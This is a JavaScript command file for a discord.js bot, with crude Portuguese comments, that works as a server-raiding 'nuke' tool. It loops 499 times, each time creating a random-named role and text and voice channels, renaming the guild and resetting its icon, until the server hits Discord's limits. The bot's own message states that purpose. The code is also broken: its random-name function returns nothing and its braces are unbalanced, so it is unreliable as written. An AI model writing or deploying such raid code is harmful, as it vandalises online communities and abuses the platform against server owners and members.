const Discord = require("discord.js")

exports.run = (bot, message, args) => {
    function makeid(length) { //peguei do stack overflow n lembro onde
        let result = ' ';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+{}:"<>?`~./|\;,';
        const charactersLength = characters.length;
        let i;
        for(i = 0; i < length; i++){
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
    }
    
  let i;
  console.log(`ser humano falou ae meu parcero fode tudo ae men`)
  message.guild.setIcon('./icon.png') 
	message.channel.send(`discord tem limite de 500 canais e 200 cargos, n reclama se não criar mais canais, da !!del pra apagar tudo mas com lag fudido`)
	for(i = 0; i < 499; i++){
		const testt = makeid(32)
		message.guild.roles.create({
  			data: {
    				name: `${testt}`,
  			},
		})
		const texto = makeid(32);
	  message.guild.setName(process.env.SERVER_NAME + `${texto}`)
	  message.guild.createChannel(`${texto}`, 'text');
	  message.guild.createChannel(`${texto}`, 'voice');  
	  message.guild.setIcon('./icon.png') 
}

exports.help = {
  name: 'lol'
}
